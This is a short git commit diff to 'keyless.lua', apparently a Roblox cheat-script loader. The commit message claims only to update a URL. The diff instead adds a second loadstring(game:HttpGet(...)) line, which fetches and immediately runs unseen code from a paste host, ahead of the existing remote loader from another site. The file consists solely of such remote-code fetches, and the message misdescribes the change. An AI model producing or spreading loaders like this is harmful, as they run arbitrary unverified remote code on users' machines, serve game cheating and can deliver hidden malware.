84a996ff8950af8a0d7bb16324341288c810d1f8
belrux <kaanchaosxd@gmail.com>
2026-05-23 01:02:44 +0300

    Update loadstring URL for keyless.lua

--- keyless.lua
+++ keyless.lua
@@ -1,1 +1,5 @@
+loadstring(game:HttpGet'https://api.rubis.app/v2/scrap/FqyNIu1LRcmEhXie/raw')()
+ 
+task.wait(3)
+
 loadstring(game:HttpGet("https://eternal-darkness.org/loaders/d00f53f04f55334aec68f0a4461dd162.lua"))()
